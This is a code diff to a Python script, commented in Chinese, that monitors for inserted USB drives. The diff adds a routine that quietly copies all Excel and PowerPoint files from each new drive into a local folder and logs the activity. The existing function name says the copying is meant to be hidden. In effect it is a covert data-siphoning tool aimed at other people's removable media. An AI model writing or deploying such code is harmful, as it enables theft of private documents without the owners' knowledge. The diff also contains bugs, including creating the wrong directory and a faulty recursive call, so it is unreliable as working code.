@@ -16,6 +16,23 @@ local_cdrom_number = 0
 mobile_device = []  # 移动设备
 mobile_letter = []  # 移动设备盘符
 mobile_number = 0  # 移动设备数
+save_path = "D:\\tmp\\copy_usb"
+log_path=os.path.join(save_path,"log_{}.txt".format(datetime.now().strftime("%Y%m%d_%H%M%S")))
+if not os.path.exists(save_path):
+    os.mkdir(log_path)
+
+class Logger(object):
+    def __init__(self, fileN="Default.log"):
+        self.terminal = sys.stdout
+        self.log = open(fileN, "w")
+
+    def write(self, message):
+        self.terminal.write(message)
+        self.log.write(message)
+        self.flush()
+    def flush(self):
+        self.log.flush()
+
 
 
 def updata():
@@ -82,22 +99,37 @@ def print_device(n):
     print("进程进入监听状态 " + "*" * 10)
     return
 
+def search_and_copy(root_dir,save_path):
+    for root,dirs,files in os.walk(root_dir):
+        for file in files:
+            if file.endswith(('.xls','.xlsx','.ppt','.pptx')):
+                if os.path.exists(os.path.join(save_path,file)):
+                    #name,suffix=file.split(".")
+                    save_file="+"+file
+                    shutil.copyfile(os.path.join(root, file), os.path.join(save_path, save_file))
+                else:
+                    shutil.copyfile( os.path.join(root,file),os.path.join(save_path,file))
+                print(f"copy file:{file}")
+        for dir in dirs:
+            search_and_copy(dir,save_path)
 
 def copy_file_to_disk_hidden(USB_path):
     # U盘的盘符
     usb_path = USB_path + "/"
     # 要复制到的路径
-    save_path = "D:/tmp/copy_usb"
+
 
     while True:
         if os.path.exists(usb_path):
-            shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))
+            search_and_copy(usb_path,save_path) #只复制特定文件
+            #shutil.copytree(usb_path, os.path.join(save_path, datetime.now().strftime("%Y%m%d_%H%M%S")))  #全部复制
             break
         else:
             time.sleep(5)
 
 
 if __name__ == "__main__":
+    sys.stdout = Logger(log_path)
     # 初次读取驱动器信息，打印驱动器详细
     now_number = 0  # 实时驱动数
     before_number = updata()  # 更新数据之前的驱动数
